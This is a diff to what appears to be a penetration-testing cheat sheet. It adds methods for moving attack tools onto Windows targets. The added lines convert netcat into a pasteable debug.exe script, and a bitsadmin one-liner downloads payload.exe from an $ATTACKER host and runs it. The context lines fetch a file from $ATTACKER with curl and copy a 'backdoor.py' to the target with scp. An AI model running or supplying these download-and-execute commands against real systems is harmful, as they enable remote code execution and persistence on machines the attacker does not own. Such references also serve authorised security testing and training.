@@ -186,6 +186,22 @@ curl http://$ATTACKER/file
 scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
 ```
 
+##### HTTP: Windows "debug.exe" Method
+In Linux, convert binary to hex ascii:
+```bash
+wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
+```
+Then paste nc.txt into Windows Shell.
+
+
+##### HTTP: Windows BitsAdmin
+```bash
+cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
+```
+
+
+
+
 
 ### Bash Ping Sweeper
 ```bash
